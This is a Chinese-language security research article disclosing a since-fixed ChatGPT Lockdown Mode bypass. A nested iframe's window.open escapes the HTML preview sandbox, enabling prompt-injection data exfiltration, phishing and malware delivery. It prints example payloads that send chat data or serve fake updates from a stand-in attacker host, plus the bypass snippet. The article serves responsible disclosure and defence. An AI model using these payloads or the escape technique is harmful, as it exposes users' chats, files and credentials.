Check Point Research 揭示 ChatGPT Lockdown Mode 绕过漏洞

ChatGPT Lockdown Mode Bypass: Phishing, Malware Delivery, and Silent Data Exfiltration

AI 导读

Check Point Research 发现 ChatGPT HTML 页面预览的沙箱绕过漏洞，可绕过 Lockdown Mode 窃取完整聊天历史与上传文件，并通过伪造窗口投递恶意软件或窃取凭据。

研究作者：Alexey Bukhteyev

主要要点

  • OpenAI 最近推出了 Lockdown Mode，这是一项可选的高级安全设置，旨在保护敏感用户数据，抵御基于提示注入的数据外泄攻击。
  • Check Point Research 发现了一个允许攻击者绕过 Lockdown Mode 的漏洞，使其核心防护措施形同虚设。
  • 该漏洞暴露了大范围攻击面，使攻击者能够静默外泄完整聊天历史、通过网络钓鱼窃取凭据以及投递恶意软件。
  • 在 ChatGPT Classic 中，该攻击无需任何用户交互：只需进行对话即可触发静默数据外泄。

简介

今年早些时候，Check Point Research 披露了ChatGPT 代码执行运行时中的安全漏洞，攻击者可通过 DNS 隧道将敏感对话数据静默外泄至其控制的服务器。DNS 隧道是一种隐藏的出站通信渠道，可绕过运行时的网络隔离。该问题的修复已迅速部署。

此外，OpenAI 后来还引入了一项新的安全功能：Lockdown Mode。

Lockdown Mode 是面向已登录 ChatGPT 用户的一项可选高级安全设置，旨在降低提示注入攻击通过促使 ChatGPT 或其某个工具发起出站网页、应用、连接器或文件下载请求来外泄敏感数据的风险。OpenAI 关于 URL 安全性的官方文章中描述了一个经典示例：攻击者诱使 AI 加载类似 attacker.example/collect?data=<private data> 的链接——即使聊天中从未出现任何可疑内容，私密数据最终也会进入攻击者的服务器日志。

鉴于即使实施了防护措施，提示注入仍然是持续存在的风险，Lockdown Mode 通过切断数据可能离开对话的通道来缓解这一风险。启用后，它会将实时网页访问限制为缓存内容，阻止加载和显示互联网图片，禁用由 Canvas 生成的代码发起网络请求，并关闭 Deep Research、Agent Mode、实时连接器和文件下载。

我们发现了 ChatGPT 中的一个漏洞，攻击者能够绕过 Lockdown Mode，并将聊天数据隐蔽地外泄至外部服务器。

涉及该漏洞的潜在攻击场景并不限于聊天数据泄露。该漏洞还允许操纵 ChatGPT Classic 界面，包括显示包含任意内容的弹出窗口，从而为种类繁多的网络钓鱼攻击打开方便之门。

该攻击可以通过多种方式实施：恶意提示、恶意 GPT 或共享聊天。

以下章节介绍了该漏洞背后的技术细节，并逐步讲解可能的漏洞利用场景。

技术细节

2026 年 2 月，OpenAI 在 ChatGPT 代码块中加入了HTML 页面预览功能。其外观如下：

当然，由于在 ChatGPT 界面中渲染由用户控制且包含 JavaScript 的 HTML 可能为私密数据外泄开辟直接路径，因此该功能的实现包含多项安全防护措施。

最明显的攻击场景包括：

  • 嵌入 URL 中包含聊天数据的外部图片：
    <img src="<https://evilwebsite.com/?q=personal_data>" /> 如果此类图片能够被渲染，攻击者就能触发零点击的私密数据外泄。
  • 嵌入外部链接：<a href="<https://evilwebsite.com/malware.exe>">Download ChatGPT update</a> 这将允许攻击者直接在 ChatGPT 界面内投放具有说服力的社会工程诱饵，并通过共享聊天进行传播。
  • 打开一个包含任意 URL 的弹出窗口，可以通过带有 target="_blank" 指令的链接实现：
    <a href="<https://evilwebsite.com/>" target="_blank">Click me</a> 或通过 JavaScript 实现：
    window.open("<https://evilwebsite.com/>", "_blank", "width=380,height=260"); 这种场景在 ChatGPT Classic 客户端中尤其危险，因为用户可能会认为该弹出窗口属于可信的应用上下文。
  • 读取 chatgpt.com 的 cookies 或 localStorage 数据。这将造成会话失陷风险。

这些场景实际上通过多层隔离和运行时强制执行得到了有效缓解。

渲染后的 HTML 被置于沙箱中，将用户可控内容与 ChatGPT 主应用上下文隔离开来，防止渲染页面直接访问父文档、ChatGPT UI 状态、cookies 或与 chatgpt.com 关联的 localStorage。

页面尝试向外部资源发送数据，或加载远程图片、脚本、链接，或打开任意外部 URL 的所有行为，都会被沙箱拦截并显示为警告：

沙箱由两个嵌套的 iframe 实现。查看其实现可以看到，沙箱并未限制 iframe 中的某些操作。例如，allow-popups 和 allow-popups-to-escape-sandbox 权限已启用。

弹出窗口采用了另一种控制方式。沙箱脚本重新定义了 window.open 函数：

window.open: h=>{if(!h)return null;const{location:f}=r;return an(o,f,h),null}

得益于这一点，当显示在 iframe 中的网页尝试打开弹出窗口时，ChatGPT 不会允许该操作，必须先经用户批准。当页面尝试使用空 URL 或 about:blank 打开弹出窗口时，该函数只会返回 null，用户甚至不会看到任何通知。

然而，由于 iframe 沙箱包含 allow-popups token，因此并未显式限制弹出窗口。

因此，如果我们能够获得真正的 window.open 函数，就能够打开弹出窗口，绕过 HTML 沙箱限制，甚至绕过 Lockdown Mode。事实上，我们可以在沙箱页面内再创建一个嵌套的 iframe，并使用其 contentWindow.open 函数：

window.open("about:blank"); // blocked

// creating a nested iframe
var f = document.createElement('iframe');
document.body.appendChild(f);

f.contentWindow.open("about:blank"); // works

此外，在成功打开弹出窗口后，攻击者可以在其中放入任意 HTML 代码。由于存在 allow-popups-to-escape-sandbox token，这些代码将不再在沙箱中执行。

攻击面：在可信界面中进行数据外泄、网络钓鱼和恶意软件下载。

该漏洞打开了广泛的攻击面。它可用于秘密窃取完整的聊天记录和上传的文件、分发伪装成合法更新的恶意软件，甚至窃取凭据。下面，我们将介绍几种场景并解释其工作原理。

通过伪造应用程序窗口投递恶意软件

通常，浏览器的默认设置会阻止 JavaScript 打开弹出窗口。打开新窗口通常需要用户执行明确操作，例如点击链接或按钮。

攻击者需要制作一个看似合理的诱饵，诱骗用户点击生成的预览。由于攻击者控制所生成页面的内容，因此很容易打造出令人信服的诱饵。打开的窗口会保留 ChatGPT 应用程序的图标，而标题由攻击者控制，从而使用户产生仍在与 ChatGPT 应用程序交互的错觉。例如，这可以用来诱骗用户下载伪装成应用程序更新的恶意软件。ChatGPT Classic 应用不允许自动下载文件，因此要下载文件，用户还必须点击相应链接。

在浏览器中实施这一场景更加容易，因为自动下载不会被阻止。此外，受害者甚至无需拥有账户，攻击者只需分享一段包含恶意页面的聊天记录，因此点击共享聊天中的任何内容都可能造成危险：

ChatGPT Classic 中的零点击利用

我们发现，基于 Electron 的 ChatGPT Classic 应用程序中的 window.open 即使没有用户手势也能运行。这使得该漏洞的危险性显著提高：攻击者可以悄无声息地外泄数据，无需用户进行任何交互，仅仅进行对话就足以触发攻击。视频 1演示了这一点，其中恶意 GPT 会悄悄将聊天消息泄露给攻击者控制的服务器。

除此之外，我们还发现，可以重新加载 ChatGPT 主应用程序窗口中的内容，并代表用户执行某些操作，例如强行将其登出账户。这可以让攻击者打造一个看似合理的诱饵，诱骗用户在攻击者控制的页面上重新进行身份验证，从而悄悄窃取其凭据。

结论

Check Point Research 已负责任地向 OpenAI 披露此漏洞。2026 年 9 月 18 日，OpenAI 告知我们，其已通过从外部 HTML 预览沙箱 iframe 中移除 allow-popups 和 allow-popups-to-escape-sandbox 权限部署了修复措施。随后我们重新测试了该问题，并确认本文所述的漏洞利用技术已不再奏效。

随着 AI 助手逐步演变为完整的执行环境，在云端运行代码、在客户端渲染内容，同时处理医疗记录、财务数据及其他高度敏感的信息，每一项新能力都会扩大攻击面，包括那些纯粹为便利性而构建的功能。

AI 代理和应用程序的防护栏及内置安全功能有助于缓解威胁，但仍无法提供绝对的安全保证。在委托 AI 处理敏感信息或授予其计算机的完整访问权限之前，务必牢记这一点。保护这些系统需要超越单个功能，并将整个平台纳入考量。现代 AI 助手带来的益处巨大，但安全地采用它们需要谨慎关注每一层，包括用户从未想到的层面。
